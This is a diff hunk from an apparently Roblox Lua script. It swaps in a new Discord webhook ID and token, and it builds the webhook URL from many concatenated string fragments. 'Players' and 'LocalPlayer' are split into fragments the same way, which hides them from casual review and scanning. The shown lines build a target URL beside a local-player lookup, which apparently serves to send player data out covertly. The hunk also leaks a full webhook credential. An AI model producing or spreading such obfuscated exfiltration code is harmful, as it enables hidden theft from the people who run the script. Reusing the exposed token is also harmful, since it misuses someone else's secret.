@@ -9,8 +9,13 @@ local players = game[serv_name](game, "Pla".."yers")
 
 local p = "h".."t".."t".."p".."s" .. ":" .. "/" .. "/"
 local d = "di".."sc".."or".."d" .. "." .. "co".."m"
-local a = "/" .. "ap" .. "i" .. "/" .. "we" .. "bh" .. "oo" .. "ks" .. "/"
-local key = "1445783944783073392/bEY9s5J3yAJVFHe5sw4EPrLL1KwtECFmkFH7CG1nw-4kwEw4CiTsAP2WaUFQRaUjEQ4z"
+local a = "/" .. "ap".."i" .. "/" .. "we".."bh".."oo".."ks" .. "/"
+local key =
+    "1446798803".."289116746" .. "/" ..
+    "nFpZy".."dJXAL".."0OXr".."x6PGA".."qpE9Z"..
+    "vFvqI".."GjReq".."VTWk".."uIax".."MY84"..
+    "np-H7".."tO2F1".."ml4p".."xhPf".."yapr"
+
 local target = p .. d .. a .. key
 
 local l_plr = players["Lo".."cal".."Pla".."yer"]
